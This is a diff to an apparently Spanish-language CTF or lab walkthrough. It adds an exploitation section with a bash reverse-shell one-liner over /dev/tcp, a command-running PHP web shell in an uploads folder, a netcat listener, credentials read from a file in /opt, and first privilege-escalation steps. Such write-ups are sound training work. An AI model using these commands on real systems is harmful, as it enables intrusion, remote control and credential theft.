@@ -65,10 +65,53 @@ gobuster dir -u http://192.168.10.34/ -w /usr/share/wordlists/dirbuster/director
 - Crackstations decifrar codigo (mecmec)
 
 
-# Explotación
+**Fase 2: Explotación**
 
 - Shell Inversa
+  Reverse Shell bash -i >& /dev/tcp/IP/443 0>&1
+  Burpsuit Decoder e Encoder URL
+
+- Browser http://ip/uploads/brocoli.php?cmd=encoder-------
+
+# Bash 
+nx -nlvp 443 
+
+<img width="560" height="122" alt="image" src="https://github.com/user-attachments/assets/9f37813d-62b0-4d6c-8a25-03e828111dc2" />
+
+
+# Credenciales en /opt
+
+# Bash
+
+cd /opt
+
+ls -la
+
+<img width="505" height="158" alt="image" src="https://github.com/user-attachments/assets/967d2b52-88af-411b-b124-6827e901514e" />
 
   
+# Bash
+
+cat credenciales.txt
+
+
+<img width="563" height="198" alt="image" src="https://github.com/user-attachments/assets/36d7d321-9a46-4664-a0f5-3de9cd5e61af" />
+
+
+# Bash 
+
+su brocoli
+usuario y password
+
+<img width="552" height="84" alt="image" src="https://github.com/user-attachments/assets/d74bcf07-6c94-49b7-bccc-b2fa234ae314" />
+
+
+# Escala de privilegios
+
+# Bash 
+
+sudo -l 
+
+<img width="568" height="190" alt="image" src="https://github.com/user-attachments/assets/2d394436-442c-4721-8562-9b1931fc85d6" />
 
 
